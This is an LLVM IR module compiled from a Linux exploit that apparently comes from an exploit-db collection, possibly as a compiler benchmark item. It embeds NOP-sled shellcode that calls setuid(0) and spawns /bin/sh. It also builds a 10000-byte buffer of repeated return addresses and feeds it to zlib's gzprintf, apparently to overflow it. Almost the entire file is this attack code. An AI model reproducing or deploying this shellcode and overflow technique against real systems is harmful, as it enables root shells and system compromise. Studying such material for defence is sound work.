; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22274.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22274.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shell = private unnamed_addr constant [56 x i8] c"\90\90\90\90\90\90\90\901\C01\DB\B0\17\CD\80\B0.\CD\80\EB\15[1\C0\88C\07\89[\08\89C\0C\8DK\081\D2\B0\0B\CD\80\E8\E6\FF\FF\FF/bin/sh\00", align 16
@.str = private unnamed_addr constant [3 x i8] c"%p\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"0x%x\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"[>] exploiting...\0A\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"/dev/null\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"[>] xret = 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"%c%c%c%c\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c">Sent!..\0A\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"gzprintf -> %d\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"gzclose -> %d [%d]\0A\00", align 1
@errno = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [56 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca [10 x i8], align 1
  %11 = alloca [10000 x i8], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [56 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([56 x i8], [56 x i8]* @__const.main.shell, i32 0, i32 0), i64 56, i1 false)
  %14 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %15 = getelementptr inbounds [56 x i8], [56 x i8]* %6, i64 0, i64 0
  %16 = call i32 (i8*, i8*, ...) @sprintf(i8* %14, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8* %15)
  %17 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %18 = call i32 @sscanf(i8* %17, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i64* %9)
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %20 = call i32 @gzopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32 %20, i32* %7, align 4
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %25, label %22

22:                                               ; preds = %2
  %23 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %24 = call i32 @exit(i32 1) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i64, i64* %9, align 8
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i64 %26)
  %28 = getelementptr inbounds [10 x i8], [10 x i8]* %10, i64 0, i64 0
  %29 = load i64, i64* %9, align 8
  %30 = and i64 %29, 255
  %31 = add nsw i64 %30, 4
  %32 = load i64, i64* %9, align 8
  %33 = ashr i64 %32, 8
  %34 = and i64 %33, 255
  %35 = load i64, i64* %9, align 8
  %36 = ashr i64 %35, 16
  %37 = and i64 %36, 255
  %38 = load i64, i64* %9, align 8
  %39 = ashr i64 %38, 24
  %40 = and i64 %39, 255
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %28, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i64 %31, i64 %34, i64 %37, i64 %40)
  %42 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %43 = call i32 @bzero(i8* %42, i32 10000)
  store i32 0, i32* %12, align 4
  br label %44

44:                                               ; preds = %51, %25
  %45 = load i32, i32* %12, align 4
  %46 = icmp slt i32 %45, 5000
  br i1 %46, label %47, label %54

47:                                               ; preds = %44
  %48 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %49 = getelementptr inbounds [10 x i8], [10 x i8]* %10, i64 0, i64 0
  %50 = call i32 @strcat(i8* %48, i8* %49)
  br label %51

51:                                               ; preds = %47
  %52 = load i32, i32* %12, align 4
  %53 = add nsw i32 %52, 4
  store i32 %53, i32* %12, align 4
  br label %44

54:                                               ; preds = %44
  %55 = call i32 @setuid(i32 0)
  %56 = call i32 @setgid(i32 0)
  %57 = load i32, i32* @stderr, align 4
  %58 = getelementptr inbounds [10000 x i8], [10000 x i8]* %11, i64 0, i64 0
  %59 = call i32 @gzprintf(i32 %57, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* %58)
  store i32 %59, i32* %8, align 4
  %60 = call i32 @setuid(i32 0)
  %61 = call i32 @setgid(i32 0)
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %63 = load i32, i32* %8, align 4
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0), i32 %63)
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @gzclose(i32 %65)
  store i32 %66, i32* %8, align 4
  %67 = load i32, i32* %8, align 4
  %68 = load i32, i32* @errno, align 4
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0), i32 %67, i32 %68)
  %70 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i32 @sscanf(i8*, i8*, i64*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @gzopen(i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @setuid(i32) #2

declare dso_local i32 @setgid(i32) #2

declare dso_local i32 @gzprintf(i32, i8*, i8*) #2

declare dso_local i32 @gzclose(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
